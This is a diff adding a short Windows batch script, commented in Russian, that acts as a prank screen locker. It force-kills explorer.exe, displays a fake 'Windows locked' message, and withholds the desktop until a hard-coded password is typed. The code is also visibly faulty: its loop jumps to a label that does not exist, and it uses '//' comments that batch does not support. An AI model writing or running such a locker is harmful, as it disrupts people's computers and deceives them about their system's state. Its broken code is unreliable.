@@ -1,0 +1,18 @@
+@echo off
+taskkill /im explorer.exe /f >nul         //процесс который завершается перед открытием консоли
+color a
+
+
+echo Your Windows OC is locked
+echo Enter Password:
+
+:р
+set /p x=
+if %x%==123321 (echo Windows OC unlocked     //123321 - пароль. Его можно изменить введя свой вместо этого.
+start explorer          //если введён правильный пароль запускается этот процесс
+exit
+) else (
+echo Error
+echo Enter Pass
+)
+goto h
